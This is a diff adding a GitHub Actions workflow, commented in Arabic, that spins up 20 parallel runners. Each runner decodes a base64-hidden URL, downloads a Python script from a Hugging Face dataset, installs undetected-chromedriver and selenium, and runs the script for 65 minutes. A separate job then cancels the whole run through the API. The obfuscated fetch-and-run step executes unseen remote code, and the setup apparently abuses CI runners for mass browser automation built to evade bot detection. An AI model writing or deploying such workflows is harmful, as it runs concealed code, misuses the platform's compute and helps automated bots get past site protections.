@@ -1,0 +1,107 @@
+name: Linux Unified Task Battalion
+
+on:
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
+
+concurrency:
+  group: unified-battalion-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # قيّم الإفناء الكامل: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # =================================================================
+  extermination-steward:
+    name: "Extermination Steward"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Unleash Absolute Extermination Order
+        run: |
+          echo "[STEWARD] Extermination steward at the helm. Complete removal armed at the 65-minute checkpoint."
+          echo "[STEWARD] Scanning workflow code: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[STEWARD] Checkpoint reached! Unleashing absolute extermination order..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[STEWARD] Absolute extermination order unleashed. Every active and pending unit will be removed."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الكتيبة
+  # =================================================================
+  constitute-battalion:
+    name: "BattalionUnit-${{ matrix.unit_identifier }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_identifier: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂
+      # ⊳ المرحلة الأولى: إرساء الأساس الجذري
+      # ❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂
+      - name: Anchor Root Foundation
+        run: |
+          echo "[ANCHOR] Anchoring root foundation for BattalionUnit-${{ matrix.unit_identifier }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂
+      # ⊳ المرحلة الثانية: تحميل الملف التنفيذي
+      # ❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂
+      - name: Download Operational Artifact
+        run: |
+          echo "[DOWNLOAD] Downloading app_task.py from primary distribution point..."
+          PRIMARY_DISTRIBUTION=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$PRIMARY_DISTRIBUTION" -o app_task.py
+          echo "[DOWNLOAD] Operational artifact downloaded successfully."
+
+      # ❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂
+      # ⊳ المرحلة الثالثة: دمج المكتبات المساندة
+      # ❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂
+      - name: Merge Supporting Libraries
+        run: |
+          echo "[MERGE] Merging supporting libraries..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂
+      # ⊳ المرحلة الرابعة: التنفيذ المُحكَم بالمدة (65 دقيقة)
+      # ❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂
+      - name: Carry Out Sealed Operation
+        run: |
+          echo ">> Constituting BattalionUnit-${{ matrix.unit_identifier }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          BATTALION_PID=$!
+          
+          echo ">> Sealed operation engaged. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $BATTALION_PID 2>/dev/null; then
+            echo ">> Sealed operation expired! Retiring operation..."
+            kill -9 $BATTALION_PID
+            echo ">> Operation retired by seal keeper."
+          else
+            echo ">> Operation closed within sealed window."
+          fi
